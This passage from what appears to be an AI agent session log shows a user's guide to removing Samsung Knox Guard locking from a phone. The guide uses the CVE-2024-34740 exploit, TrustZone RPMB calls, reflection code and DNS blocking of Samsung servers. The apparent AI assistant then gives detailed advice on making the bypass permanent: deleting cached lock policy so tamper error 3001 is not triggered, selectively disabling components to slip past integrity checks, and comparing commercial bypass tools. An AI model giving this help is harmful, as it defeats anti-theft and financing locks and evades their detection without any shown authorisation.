| Result |\n   659→|------|--------|\n   660→| `tz_getTAState(0)` BEFORE | `int=3` (Locked) |\n   661→| `tz_unlockScreen(0)` | `err=0, result=0` (SUCCESS) |\n   662→| `tz_userChecking(0)` | `err=262` (failed, doesn't matter) |\n   663→| `tz_resetRPMB(0)` (v9) | `err=0, result=0` (SUCCESS) |\n   664→| `tz_getTAState(0)` AFTER | `int=2` (Active) |\n   665→\n   666→**The TA state changed from Locked(3) to Active(2) in RPMB.**\n   667→\n   668→After reboot: `ro.boot.kg` changed from `0x3` to `0x2` -- this persists through reboots because it's stored in RPMB (TrustZone hardware-backed storage).\n   669→\n   670→### Step 6.4: Additional Service-Level Actions\n   671→\n   672→In addition to the TrustZone calls, v10 of droppedapk also:\n   673→\n   674→1. **Unregistered KG boot receivers:**\n   675→```java\n   676→Field receiverField = kgService.getClass().getDeclaredField(\"mSystemReceiver\");\n   677→receiverField.setAccessible(true);\n   678→Object receiver = receiverField.get(kgService);\n   679→ctx.unregisterReceiver((BroadcastReceiver) receiver);\n   680→receiverField.set(kgService, null);\n   681→// Same for mServiceSystemReceiver\n   682→```\n   683→\n   684→2. **Set system property:**\n   685→```java\n   686→Class<?> sysProp = Class.forName(\"android.os.SystemProperties\");\n   687→Method set = sysProp.getMethod(\"set\", String.class, String.class);\n   688→set.invoke(null, \"knox.kg.state\", \"Completed\");\n   689→```\n   690→\n   691→3. **Attempted to clear Device Owner:**\n   692→```java\n   693→// Failed -- DPM service binder doesn't have this$0 field on Samsung\n   694→```\n   695→\n   696→4. **Re-enabled kgclient:**\n   697→```java\n   698→Object pmBinder = sm.getMethod(\"getService\", String.class).invoke(null, \"package\");\n   699→Method setEnabled = pmBinder.getClass().getDeclaredMethod(\n   700→    \"setApplicationEnabledSetting\",\n   701→    String.class, int.class, int.class, int.class, String.class);\n   702→setEnabled.setAccessible(true);\n   703→setEnabled.invoke(pmBinder, \"com.samsung.android.kgclient\", 1, 0, 0, \"android\");\n   704→```\n   705→\n   706→---\n   707→\n   708→## Phase 7: The 8133 Error and Re-enabling kgclient\n   709→\n   710→### The 8133 Error Explained\n   711→\n   712→Error 8133 is a **bitfield** computed dynamically on every boot by `IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()`. It is NOT stored anywhere -- it's freshly calculated by checking if kgclient and its 6 components are enabled:\n   713→\n   714→| Bit | Component | Value |\n   715→|-----|-----------|-------|\n   716→| CLIENT_INTEGRITY_BASE2 | kgclient app itself | 8192 (0x2000) |\n   717→| ENABLED | App enabled state | (included in base) |\n   718→| ADMIN_RECEIVER | KGDeviceAdminReceiver | (bit flag) |\n   719→| SYSTEM_INTENT_RECEIVER | SystemIntentReceiver | (bit flag) |\n   720→| SELFUPDATE_RECEIVER | SelfupdateReceiver | (bit flag) |\n   721→| KG_EVENT_SERVICE | KGEventService | (bit flag) |\n   722→| ALARM_SERVICE | AlarmService | (bit flag) |\n   723→| KG_PROVIDER | KGProvider | (bit flag) |\n   724→\n   725→Our earlier `pm disable-user` disabled the app AND all 6 components, setting every bit and producing 8133.\n   726→\n   727→**IntegritySeUtil also checks:**\n   728→- Signature validation against Android platform signature\n   729→- Minimum version code >= 300000000\n   730→- All six core components enabled\n   731→- FLAG_SYSTEM set on app\n   732→- TA integrity via RPMB and HMAC\n   733→\n   734→### The Fix\n   735→\n   736→Re-enable kgclient and all its components so the integrity check passes:\n   737→\n   738→```bash\n   739→adb shell pm enable com.samsung.android.kgclient\n   740→```\n   741→\n   742→Plus, from droppedapk (UID 1000), calling `setApplicationEnabledSetting` via PackageManagerService reflection.\n   743→\n   744→**After reboot with kgclient re-enabled:** 8133 and 3001 errors GONE. First clean boot.\n   745→\n   746→### The Problem\n   747→\n   748→With kgclient re-enabled and running cleanly, it booted and checked its **cached lock policy**. Even though TA state was Active(2) and `handleBootCompleted` skipped `bindAndSetToLockScreen` (because state != 3/Locked), kgclient's own `BOOT_COMPLETED` receiver ran a separate code path that contacted Samsung servers or read cached policy and **RE-LOCKED the device**.\n   749→\n   750→This re-lock also disabled USB debugging, which killed ADB access.\n   751→\n   752→---\n   753→\n   754→## Phase 8: ADB Lost, Factory Reset\n   755→\n   756→### How ADB Was Lost\n   757→\n   758→When kgclient was re-enabled and the phone rebooted:\n   759→1. kgclient booted cleanly (no integrity errors)\n   760→2. kgclient's BOOT_COMPLETED receiver ran\n   761→3. kgclient read its cached lock policy\n   762→4. kgclient re-locked the device AND disabled USB debugging\n   763→5. ADB daemon stopped accepting connections\n   764→\n   765→**Verification:**\n   766→- Phone still visible on USB (confirmed via `ioreg`)\n   767→- AT modem still accessible at `/dev/tty.usbmodemRFCW2006DLA2`\n   768→- But `adb devices` shows nothing\n   769→\n   770→### Factory Reset Decision\n   771→\n   772→With ADB lost, the decision was made to factory reset. The reasoning:\n   773→\n   774→**What factory reset preserves:**\n   775→- RPMB state: TA state stays at **Active(2)** -- this is the key achievement\n   776→- OTP fuse: `ro.boot.kg.bit` stays at `01` (hardware, cannot change regardless)\n   777→\n   778→**What factory reset wipes:**\n   779→- `/data` partition: all apps, settings, user data, packages.xml\n   780→- droppedapk installation\n   781→- Device Owner provisioning\n   782→- Cached KG lock policies\n   783→\n   784→**Expected behavior after factory reset:**\n   785→1. Phone boots to Setup Wizard\n   786→2. kgclient starts fresh -- default enabled, no tampering evidence, all components intact\n   787→3. Integrity check passes (no 8133)\n   788→4. `handleBootCompleted` checks TA state: **2 != 3** -> **SKIP lock binding**\n   789→5. Phone should boot without KG lock\n   790→\n   791→**Risk:** kgclient may contact Samsung servers during WiFi setup and receive a fresh lock command, transitioning TA state back to Locked(3).\n   792→\n   793→---\n   794→\n   795→## Current State and Next Steps\n   796→\n   797→### Current State (as of March 19, 2026)\n   798→\n   799→| Property | Value |\n   800→|----------|-------|\n   801→| TA State (RPMB) | **2 (Active)** -- permanent, survives factory reset |\n   802→| OTP Fuse | **01** (KG enabled -- hardware fuse, permanent) |\n   803→| `ro.boot.kg` | **0x2** |\n   804→| ADB | Lost (kgclient disabled USB debugging before factory reset) |\n   805→| droppedapk | Was installed, will be wiped by factory reset |\n   806→| Factory Reset | In progress |\n   807→\n   808→### Scenario A: Factory Reset Works\n   809→\n   810→If the phone boots to Setup Wizard without KG lock:\n   811→1. Set up phone normally\n   812→2. Avoid connecting to WiFi during setup if possible (prevent Samsung server contact)\n   813→3. If WiFi is required, use the DNS blocker on Mac first:\n   814→   ```bash\n   815→   sudo python3 /Users/kyin/kg_block_dns.py\n   816→   ```\n   817→   Set phone's DNS to Mac's IP during WiFi setup\n   818→4. KG should remain in Active(2) state without locking\n   819→\n   820→### Scenario B: Factory Reset Doesn't Work (kgclient re-locks)\n   821→\n   822→If kgclient contacts Samsung and receives a lock command:\n   823→\n   824→1. **Re-provision via QR code** (we've done this before -- see Phase 2)\n   825→2. **Rebuild and re-run AbxOverflow exploit** (see Phase 4)\n   826→3. **Modify droppedapk to be fully autonomous:**\n   827→   - Add a `BOOT_COMPLETED` BroadcastReceiver (already exists as `LaunchReceiver`)\n   828→   - Instead of starting an Activity, run the full KG unlock sequence directly in the receiver:\n   829→     - `tz_unlockScreen(0)`\n   830→     - `tz_resetRPMB(0)`\n   831→     - `setRemoteLockToLockscreen(false)`\n   832→     - `unlockCompleted()`\n   833→     - `unbindFromLockScreen()`\n   834→   - This way, on every boot, droppedapk automatically clears KG before kgclient can re-lock\n   835→4. **Alternative: Move TA state to Completed(4) or Prenormal(0)**\n   836→   - Currently at Active(2), which still allows kgclient to re-lock\n   837→   - If we can find a way to call `tz_setTAState(4)` or equivalent, KG would consider itself completed\n   838→   - May need to find the right combination of TrustZone calls\n   839→\n   840→### Scenario C: Blocking Samsung Servers\n   841→\n   842→Prevent kgclient from contacting Samsung servers to receive lock commands:\n   843→\n   844→**DNS Blocker** (`/Users/kyin/kg_block_dns.py`):\n   845→```bash\n   846→# Run on Mac (requires root for port 53)\n   847→sudo python3 /Users/kyin/kg_block_dns.py\n   848→```\n   849→\n   850→Blocks these domains:\n   851→- `us-kcs-api.samsungknox.com`\n   852→- `kcs-api.samsungknox.com`\n   853→- `eu-kcs-api.samsungknox.com`\n   854→- `cn-kcs-api.samsungknox.com`\n   855→- `gslb.samsungknox.com`\n   856→- `knoxguard.samsungknox.com`\n   857→- `knox-guard.samsungknox.com`\n   858→- `kgapi.samsungknox.com`\n   859→\n   860→**HTTP Proxy** (`/Users/kyin/kg_block_proxy.py`):\n   861→```bash\n   862→python3 /Users/kyin/kg_block_proxy.py\n   863→# Listens on port 9999\n   864→```\n   865→\n   866→Blocks any URL containing: `samsungknox.com`, `knoxguard`, `kcs-api`, `knox-guard`, `kgapi`\n   867→\n   868→---\n   869→\n   870→## Knox Guard Architecture Reference\n   871→\n   872→### Service Structure\n   873→\n   874→```\n   875→KnoxGuardSeService (in services.jar, system_server process)\n   876→  |-- handleBootCompleted()\n   877→  |     |-- checks TA state via KnoxGuardNative.tz_getTAState()\n   878→  |     |-- if state == Locked(3): bindAndSetToLockScreen()\n   879→  |     |-- if state != Locked(3): skip lock\n   880→  |\n   881→  |-- KnoxGuardNative (JNI bridge to TrustZone)\n   882→  |     |-- tz_getTAState(int) -> KgErrWrapper\n   883→  |     |-- tz_unlockScreen(int) -> KgErrWrapper\n   884→  |     |-- tz_lockScreen(int) -> KgErrWrapper\n   885→  |     |-- tz_userChecking(int) -> KgErrWrapper\n   886→  |     |-- tz_resetRPMB(int) -> KgErrWrapper\n   887→  |\n   888→  |-- IntegritySeUtil (client integrity checking)\n   889→  |     |-- checkKGClientIntegrityAndEnableComponentsWithFlag()\n   890→  |     |-- checkSignatures() (platform signature validation)\n   891→  |     |-- isEnabled() (component enabled check)\n   892→  |\n   893→  |-- SystemIntentProcessor\n   894→  |     |-- handleBootCompleted()\n   895→  |     |-- lockSeDevice(context, errorCode)\n   896→  |\n   897→  |-- KGEventHandler\n   898→        |-- ON_BOOT_COMPLETED -> SystemIntentProcessor.handleBootCompleted()\n   899→        |-- ON_SETUP_WIZARD_COMPLETED\n   900→        |-- ON_USER_PRESENT\n   901→        |-- ON_PACKAGE_REPLACED_OR_REMOVED\n   902→        |-- ON_PACKAGE_DATA_CLEARED -> lockSeDevice(ERROR_CLIENT_APP_DATA_CLEARED=\"3001\")\n   903→```\n   904→\n   905→### Error Codes\n   906→\n   907→| Code | Constant | Meaning |\n   908→|------|----------|---------|\n   909→| 3001 | ERROR_CLIENT_APP_DATA_CLEARED | kgclient data was cleared |\n   910→| 3020 | ERROR_CLIENT_INTEGRITY | Generic integrity failure |\n   911→| 3040 | ERROR_CLIENT_INTEGRITY_FOR_CHINA | China-specific integrity failure |\n   912→| 8133 | (bitfield) | Abnormal detection -- multiple components disabled |\n   913→\n   914→### Key Constants (from samsung_framework source)\n   915→\n   916→```java\n   917→// Permission\n   918→KG_PERMISSION = \"com.samsung.android.knoxguard.STATUS\"\n   919→KG_PACKAGE_NAME = \"com.samsung.android.kgclient\"\n   920→\n   921→// System Properties\n   922→KG_SYSTEM_PROPERTY = \"knox.kg.state\"\n   923→KG_OTP_BIT_SYSTEM_PROPERTY = \"ro.boot.kg.bit\"\n   924→\n   925→// Intent Actions\n   926→INTENT_RETRY_LOCK = \"com.samsung.android.knoxguard.RETRY_LOCK\"\n   927→INTENT_KG_PACKAGE_ADDED = \"com.samsung.kgclient.android.intent.action.KG_PACKAGE_ADDED\"\n   928→INTENT_SETUPWIZARD_COMPLETE = \"com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE\"\n   929→\n   930→// Content Provider\n   931→KG_LOG_URI = \"content://com.samsung.android.kgclient.statusprovider/CONTENT_LOG\"\n   932→```\n   933→\n   934→### KG Boot Flow (simplified)\n   935→\n   936→```\n   937→Boot -> kernel -> init -> system_server starts\n   938→  |\n   939→  v\n   940→KnoxGuardSeService.onStart()\n   941→  |\n   942→  v\n   943→IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()\n   944→  |-- Check kgclient app enabled\n   945→  |-- Check 6 components enabled\n   946→  |-- Check platform signature match\n   947→  |-- Check minimum version code\n   948→  |-- If any fail -> compute error bitfield (e.g., 8133)\n   949→  |\n   950→  v\n   951→SystemIntentProcessor.handleBootCompleted()\n   952→  |\n   953→  v\n   954→KnoxGuardNative.tz_getTAState(0) -> read RPMB\n   955→  |\n   956→  +-- if state == Locked(3):\n   957→  |     bindAndSetToLockScreen()\n   958→  |     -> full KG lock overlay displayed\n   959→  |\n   960→  +-- if state == Active(2):\n   961→  |     SKIP lock binding\n   962→  |     -> phone boots normally (but kgclient may still re-lock via its own receiver)\n   963→  |\n   964→  +-- if state == Completed(4) or Prenormal(0):\n   965→        No action needed, device is free\n   966→```\n   967→\n   968→---\n   969→\n   970→## Tool Inventory\n   971→\n   972→### On Mac\n 1023→## Appendix: Full Source Code\n  1024→\n  1025→### A. AbxInjector.java (ABX binary format injection)\n  1026→\n  1027→**File:** `/Users/kyin/Downloads/AbxOverflow/app/src/main/java/com/example/abxoverflow/AbxInjector.java`\n  1028→\n  1029→This class constructs raw ABX binary tokens that get injected into `install_sessions.xml` via the integer overflow. Key methods:\n  1030→\n  1031→- `injectSession()` -- creates a fake `<session>` element with attacker-controlled `sessionStageDir`\n  1032→- `injectInto()` -- pads payload to exact 65536-byte multiple and sets it as a `Checksum` on a `PackageInstaller.Session`\n  1033→- `endDocument()` -- writes `END_DOCUMENT` token to prevent parsing beyond injection point\n  1034→\n  1035→The injection works because `BinaryXmlSerializer.attributeBytesBase64()` writes the length as a `short` (2 bytes), so a 65536-byte array has its length truncated to 0. On read, `BinaryXmlPullParser` reads 0 bytes for the \"checksum\" value, then encounters the actual payload bytes and interprets them as ABX tokens.\n  1036→\n  1037→### B. Main.java (exploit stages)\n  1038→\n  1039→**File:** `/Users/kyin/Downloads/AbxOverflow/app/src/main/java/com/example/abxoverflow/Main.java`\n  1040→\n  1041→- `stage1()` -- creates injection sessions, calls `AbxInjector.injectInto()`, triggers `install_sessions.xml` write\n  1042→- `stage2()` -- opens tampered sessions, drops APK, patches `packages.xml`, writes `packages-backup.xml`\n  1043→- `crashSystemServer()` -- uses `Parcelable` chain via `IAlarmManager.set()` to trigger SIGSEGV in system_server\n  1044→\n  1045→### C. droppedapk/MainActivity.java (KG exploitation payload)\n  1046→\n  1047→**File:** `/Users/kyin/Downloads/AbxOverflow/droppedapk/src/main/java/com/example/abxoverflow/droppedapk/MainActivity.java`\n  1048→\n  1049→The v10 build runs a 10-step sequence in `callKnoxGuardService()`:\n  1050→1. Read TA state (BEFORE)\n  1051→2. Call `tz_unlockScreen(0)`\n  1052→3. Call `tz_userChecking(0)`\n  1053→4. Read TA state (AFTER)\n  1054→5. Call service-level `unlockScreen()`, `unbindFromLockScreen()`, `setRemoteLockToLockscreen(false)`\n  1055→6. Unregister `mSystemReceiver` and `mServiceSystemReceiver` to prevent re-lock\n  1056→7. Call `tz_resetRPMB(0)` (tries both `(int, byte[])` and `(int)` signatures)\n  1057→8. Attempt `clearDeviceOwner` via DPM (failed on Samsung)\n  1058→9. Re-enable kgclient via PackageManagerService reflection\n  1059→10. Set `knox.kg.state` system property to \"Completed\"\n  1060→\n  1061→Also includes `onOptionsItemSelected()` handler for self-uninstall that cleans up `<pastSigs>` from `packages.xml` first.\n  1062→\n  1063→### D. run_exploit.sh (Mac-side orchestrator)\n  1064→\n  1065→**File:** `/Users/kyin/Downloads/AbxOverflow/run_exploit.sh`\n  1066→\n  1067→Manages the two-reboot exploit flow from the Mac side:\n  1068→1. Pre-flight: check ADB connection, install APK if needed, clear old state\n  1069→2. Stage 1: launch with `--ei stage 1`, poll for `STAGE1_DONE` in log file, wait for reboot\n  1070→3. Stage 2: after reboot, launch with `--ei stage 2`, poll for `STAGE2_DONE`, wait for reboot\n  1071→4. Verify: check if `com.example.abxoverflow.droppedapk` is in package list\n  1072→\n  1073→---\n  1074→\n  1075→## Key Lessons Learned\n  1076→\n  1077→1. **KG state lives in TrustZone RPMB** -- software settings (`knox.kg.state`, cached policies) are just cache. They get overwritten on boot from RPMB. To permanently change KG state, you must talk to the TrustZone TA.\n  1078→\n  1079→2. **`pm disable-user` on kgclient triggers error 8133** -- this is a dynamically computed bitfield, not a stored value. It checks if kgclient + 6 components are enabled on every boot. Don't disable them.\n  1080→\n  1081→3. **CVE-2024-34740 works on Samsung Android 13 (July 2023 SPL)** -- gives UID 1000 code execution in system_server. The exploit is reliable and repeatable.\n  1082→\n  1083→4. **Samsung does full reboots, not userspace restarts** -- the original `RebootBackgroundRunner` approach from the PoC doesn't work. Mac-side orchestration is required.\n  1084→\n  1085→5. **droppedapk can be rebuilt and reinstalled freely** -- as long as you sign with the same debug keystore, `adb install -r` preserves UID 1000 status.\n  1086→\n  1087→6. **KnoxGuardNative is in services.jar classes3.dex** -- must use the KnoxGuardSeService's classloader to load it, not `Class.forName()`.\n  1088→\n  1089→7. **`tz_unlockScreen(0)` and `tz_resetRPMB(0)` both succeed** and changed TA state from Locked(3) to Active(2). This is the permanent change we needed.\n  1090→\n  1091→8. **Re-enabling kgclient clears 8133 but kgclient then re-locks** via its own boot receiver contacting servers or reading cached lock policy.\n  1092→\n  1093→9. **Active(2) is not the same as Completed(4)** -- Active means KG is provisioned but not currently locking. kgclient may still receive a lock command from Samsung servers and transition back to Locked(3). Completed(4) or Prenormal(0) would be the true unlock.\n  1094→\n  1095→10. **The winning combination might be:** TA state Active(2) + factory reset (wipes cached policies) + block Samsung servers during initial setup (prevent fresh lock command) + never let kgclient contact Samsung again.\n  1096→\n  1097→---\n  1098→\n  1099→## Revision History\n  1100→\n  1101→| Date | Change |\n  1102→|------|--------|\n  1103→| 2026-03-18 | Initial recon, dead ends, AT modem exploration |\n  1104→| 2026-03-19 AM | QR provisioning, ADB access, failed KG removal attempts |\n  1105→| 2026-03-19 PM | AbxOverflow exploit, UID 1000 code execution, TrustZone RPMB manipulation |\n  1106→| 2026-03-19 EVE | TA state changed to Active(2), kgclient re-lock, ADB lost, factory reset initiated |\n  1107→"}]},"uuid":"a1a600b7-60e4-4a2e-8643-9d9e6667c9e7","timestamp":"2026-03-20T00:32:11.280Z","sourceToolAssistantUUID":"ae8b6975-eb9a-4a47-b5f8-eddd5a526329","userType":"external","entrypoint":"cli","cwd":"/Users/kyin/Downloads/AbxOverflow","sessionId":"afd7d744-6ded-4443-a22c-68758d54c73f","version":"2.1.79","gitBranch":"HEAD","slug":"resilient-beaming-twilight"}

Let me synthesize everything.\n\nHere is the complete research synthesis for your 7 questions:\n\n---\n\n## 1. Where does kgclient store the cached lock policy?\n\nBased on the architecture documented in your KG_UNLOCK_GUIDE.md and web research, kgclient stores data at the standard Android path `/data/data/com.samsung.android.kgclient/` (or `/data/user/0/com.samsung.android.kgclient/`) with the typical subdirectories: `shared_prefs/`, `databases/`, `cache/`, `files/`.\n\nThe known content provider URI from your own decompilation is:\n```\ncontent://com.samsung.android.kgclient.statusprovider/CONTENT_LOG\n```\n\nThe exact SharedPreferences key names for the lock policy are not publicly documented anywhere I could find. However, based on the behavior you observed -- clean first boot after factory reset (no cached data), then persistent re-locking after WiFi connection -- the lock command from Samsung's server is cached in one of these locations. **You can enumerate them directly from UID 1000** since system_server has filesystem access to `/data/data/com.samsung.android.kgclient/`.\n\n**Recommended action from your droppedapk:**\n```java\n// List all files in kgclient's data directory\njava.io.File dataDir = new java.io.File(\"/data/data/com.samsung.android.kgclient\");\n// Recursively list shared_prefs/, databases/, files/\n```\n\nThis is the fastest path to identifying the exact files. You have UID 1000, so DAC permissions should allow reading kgclient's data directory (both run under the system user group).\n\n---\n\n## 2. Will direct file deletion trigger error 3001?\n\n**Strong evidence says NO.** This is the most important finding.\n\nSamsung's error 3001 documentation says: \"Knox Guard client app data is deleted.\" The detection mechanism is `KGEventHandler.ON_PACKAGE_DATA_CLEARED`, which fires `lockSeDevice(ERROR_CLIENT_APP_DATA_CLEARED=\"3001\")`.\n\nFrom your own decompilation notes, `KGEventHandler` responds to `ON_PACKAGE_DATA_CLEARED`, which maps to the Android `ACTION_PACKAGE_DATA_CLEARED` broadcast.\n\n**The critical point:** `ACTION_PACKAGE_DATA_CLEARED` is a **protected broadcast** that is ONLY sent by the system's `PackageManagerService.clearApplicationUserData()` method. This is invoked by:\n- `pm clear <package>` (ADB command)\n- Settings > Apps > Clear Data\n- `ActivityManager.clearApplicationUserData()`\n\n**Direct file deletion via `java.io.File.delete()` does NOT trigger `PackageManagerService.clearApplicationUserData()` and therefore does NOT send `ACTION_PACKAGE_DATA_CLEARED`.** The broadcast is only sent as part of the official PM clear-data flow in AOSP's `PackageManagerService`.\n\nThis means you can selectively delete SharedPreferences XML files or database files from `/data/data/com.samsung.android.kgclient/shared_prefs/` and `/data/data/com.samsung.android.kgclient/databases/` using `java.io.File.delete()` from your UID 1000 code, and 3001 should NOT trigger.\n\n**One caveat:** SELinux. system_server runs as `u:r:system_server:s0` and kgclient's data files are labeled `u:object_r:app_data_file:s0:c...`. On stock Samsung Android 13, system_server typically has limited access to app_data_file. You may need to check via `ls -laZ /data/data/com.samsung.android.kgclient/` whether system_server can read/write those files. However, since both are UID 1000, the DAC check should pass -- the question is MAC (SELinux).\n\n---\n\n## 3. What makes kgclient STOP trying to lock after 3-4 attempts on fresh boot?\n\nBased on the Knox Guard documentation and your observations:\n\n**On a clean boot (no cached data):** kgclient starts with no policy. It registers for `CONNECTIVITY_CHANGE` and tries to contact Samsung servers. The 3-4 lock attempts you saw were likely kgclient's initial enrollment/activation check cycle. Since TA state was Active(2) not Locked(3), the framework-level `handleBootCompleted()` in `KnoxGuardSeService` skipped `bindAndSetToLockScreen()`. The 3-4 flashes were kgclient's own code path trying to establish policy, not the framework service.\n\n**Once kgclient connected to WiFi and contacted Samsung's servers:** The server responded with a lock command (because the device is registered as KG-locked in Samsung's cloud). kgclient cached this command locally and began replaying it on every `CONNECTIVITY_CHANGE`.\n\n**What makes it stop on fresh boot:** Without cached policy and without server contact, kgclient has no lock instruction to execute. It attempts a few handshake/check cycles, finds no policy (and TA state = Active, not Locked), then settles into idle polling.\n\n**The auto-lock behavior you're seeing post-WiFi connection** is the \"auto-lock\" feature from Knox Guard documentation: \"When auto-lock is enabled, Knox Guard enrolled devices automatically lock as soon as they connect to a network.\"\n\n---\n\n## 4. Can you delete just the lock command entry instead of all data?\n\nYes, in principle. Since kgclient uses a `ContentProvider` (`KGProvider` at URI `content://com.samsung.android.kgclient.statusprovider/CONTENT_LOG`) and likely stores policy in SharedPreferences or a SQLite database, you can surgically target just the lock policy.\n\n**Recommended approach:**\n1. From droppedapk, enumerate all files in `/data/data/com.samsung.android.kgclient/shared_prefs/` and `/data/data/com.samsung.android.kgclient/databases/`\n2. Read each SharedPreferences XML file -- look for keys containing \"lock\", \"policy\", \"remote\", \"command\", \"action\", or server response data\n3. Read each SQLite database -- list tables and look for lock-related tables\n4. Delete or modify just the relevant entries\n\nSince `File.delete()` won't trigger 3001, you could:\n- Delete the specific SharedPreferences file that contains the lock policy\n- Or better: read the XML, remove just the lock-related keys, write it back\n\n**Even better:** Since kgclient will just re-fetch the policy on next `CONNECTIVITY_CHANGE`, you should combine this with your existing `killIntentRelay()` approach (clearing `mActionList` and nulling `mRemoteLockMonitorCallback`) to prevent kgclient from ever receiving the trigger to re-lock.\n\n---\n\n## 5. Can you abort CONNECTIVITY_CHANGE before kgclient receives it?\n\n**No.** `CONNECTIVITY_CHANGE` (`android.net.conn.CONNECTIVITY_CHANGE`) is sent as a **normal broadcast** via `sendBroadcast()`, NOT as an ordered broadcast via `sendOrderedBroadcast()`. Normal broadcasts cannot be aborted by any receiver -- `abortBroadcast()` only works on ordered broadcasts.\n\nAdditionally, on Android 7+, `CONNECTIVITY_ACTION` is delivered only to dynamically registered (context-registered) receivers, not manifest-declared ones. This means kgclient registers its receiver at runtime in its service.\n\n**However**, your existing approach is better: you're already clearing `mActionList` on `KnoxGuardSeService` which breaks the intent relay mechanism. The `CONNECTIVITY_CHANGE` broadcast reaches `KnoxGuardSeService`'s registered receiver, but the relay to kgclient is severed because `mActionList` is empty.\n\nThe issue is that `mActionList` gets repopulated. You should investigate whether kgclient re-registers itself or whether `KnoxGuardSeService` rebuilds the list.\n\n---\n\n## 6. How does ZeroKnox/Knoxium achieve permanent bypass?\n\nBased on research across multiple sources:\n\n**Knoxium's approach:** Uses MacroDroid (an automation app) to create persistent rules that automatically counteract Knox Guard re-locking. It:\n1. Disables kgclient via `pm disable-user` and `pm uninstall`\n2. Installs MacroDroid with a preconfigured macro (`macro-knoxium.mdr`) that \"will prevent Knox from remotely re-locking the device\"\n3. Uses accessibility service automation to persistently block KG\n\n**KnoxGuard Disabler (Magisk module):** Uses DynamicInstaller framework to \"patch the system to prevent the device screen lock caused by a removed KnoxGuard (KgClient) service.\" This works at the system partition level because Magisk can overlay `/system`. The patch likely modifies `services.jar` to neuter `KnoxGuardSeService`'s lock methods.\n\n**ChimeraTool's approach:** Operates at the hardware level using EDL/EUB mode to directly modify the KG state in NVRAM/EFS/RPMB. For Qualcomm devices (like your Fold 4), it connects in EDL mode using test points to directly rewrite the KG state to \"Completed\" or \"AllZero\". This is the most permanent solution but requires hardware-level access.\n\n**For your situation:** You already have UID 1000 and the ability to call `tz_resetRPMB(0)` and `tz_unlockScreen(0)`. The missing piece is not the TA state (you got it to Active(2)) -- it's that kgclient re-contacts the server and re-caches the lock policy. The permanent solution would be one of:\n- Delete the cached policy AND keep `mActionList` cleared persistently (your guardian already does this)\n- Find and delete the specific SharedPreferences/database entry that stores the cached lock command\n- Disable kgclient's specific network-related components (not the whole app) to prevent it from ever contacting Samsung\n\n---\n\n## 7. Can you modify kgclient's APK on disk from UID 1000?\n\n**No.** The APK is at `/system/priv-app/KnoxGuard/KnoxGuard.apk` (or similar path). On Samsung Android 13:\n\n- `/system` is mounted read-only as part of the super partition\n- dm-verity enforces integrity checking on the system partition\n- Even UID 1000 (system) cannot remount `/system` as read-write -- this requires root (UID 0) AND disabling dm-verity AND AVB\n- Samsung's bootloader enforces Verified Boot, so any modification to `/system` would fail the verification on next boot\n\n**Alternative approach that DOES work from UID 1000:**\n\nUse `PackageManager.setComponentEnabledSetting()` to disable specific kgclient components (NOT the whole app -- that triggers 8133). Based on the UAD GitHub issue (#188), a user successfully disabled 11 internal subservices using Service Disabler without triggering a lock. The key is to identify which services handle the network/lock logic and disable ONLY those, while keeping the 6 components that IntegritySeUtil checks enabled (KGDeviceAdminReceiver, SystemIntentReceiver, SelfupdateReceiver, KGEventService, AlarmService, KGProvider).\n\nFrom your droppedapk, you can call:\n```java\nPackageManager pm = context.getPackageManager();\npm.setComponentEnabledSetting(\n    new ComponentName(\"com.samsung.android.kgclient\", \"<specific.service.class>\"),\n    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,\n    PackageManager.DONT_KILL_APP);\n```\n\nThe challenge is identifying which components are safe to disable (the ones handling server communication/lock execution) vs which ones IntegritySeUtil checks. Your existing decompilation already identified the 6 checked components. Any OTHER components in kgclient can safely be disabled.\n\n---\n\n## Recommended Next Steps (Priority Order)\n\n1. **Enumerate kgclient's data directory** from droppedapk. List everything in `shared_prefs/`, `databases/`, `files/`. Read and log the contents of each SharedPreferences XML file. This will immediately tell you where the lock policy is cached.\n\n2. **Delete the cached lock policy files** via `File.delete()` (won't trigger 3001). Combined with your guardian clearing `mActionList` and `mRemoteLockMonitorCallback`, this should stop the re-locking cycle.\n\n3. **List ALL components** in kgclient's manifest (services, receivers, activities beyond the 6 checked ones) and selectively disable the network/server communication components.\n\n4. **Block Samsung servers at the network level** using your existing DNS blocker during the critical window.\n\nSources:\n- [Knox Guard Troubleshoot -
